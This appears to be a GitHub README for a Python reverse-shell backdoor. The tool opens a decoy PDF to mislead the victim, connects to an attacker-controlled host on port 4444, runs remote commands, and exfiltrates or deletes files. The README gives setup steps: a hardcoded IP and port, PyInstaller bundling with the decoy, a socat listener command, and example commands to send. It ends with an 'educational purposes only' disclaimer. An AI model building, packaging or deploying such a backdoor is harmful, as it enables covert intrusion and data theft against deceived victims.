

<img width="720" height="720" alt="Image" src="https://github.com/user-attachments/assets/0a19fd1f-d280-4886-8326-a3036d9db745" />

📦 Features
Connects to a remote server via TCP

Executes shell commands remotely

Supports directory navigation (cd)

Downloads files (base64-encoded)

Removes files from the system

Opens a PDF file as a decoy

Compatible with PyInstaller bundling

🚀 How It Works
The script changes the working directory to the system's temporary folder.

It opens a PDF file (documento.pdf) using the default viewer.

It connects to a remote server and enters a command loop.

Commands sent from the server are executed locally and results are returned.

🛠️ Usage
1. Prepare the Client
Place documento.pdf in the same directory as the script.

Update the IP and port in the script:

python
HOST = "192.168.1.11"
PORT = 4444
Run the script:

bash
python main.py
Or bundle it with PyInstaller:

bash
pyinstaller --onefile --add-data "documento.pdf;." main.py
2. Set Up the Listener with socat
To receive connections and interact with the backdoor, use socat:

bash
socat -v TCP-LISTEN:4444,reuseaddr,fork STDIO
-v: Verbose output

TCP-LISTEN:4444: Listens on port 4444

reuseaddr: Allows reuse of the port

fork: Handles multiple connections

STDIO: Connects input/output to your terminal

📂 Command Examples
Once connected, you can send commands like:

bash
cd C:\Users\Public
download C:\Users\Public\file.txt
remove C:\Temp\malicious.exe
ipconfig
exit
📄 License
This project is for educational purposes only. Use responsibly and ethically.
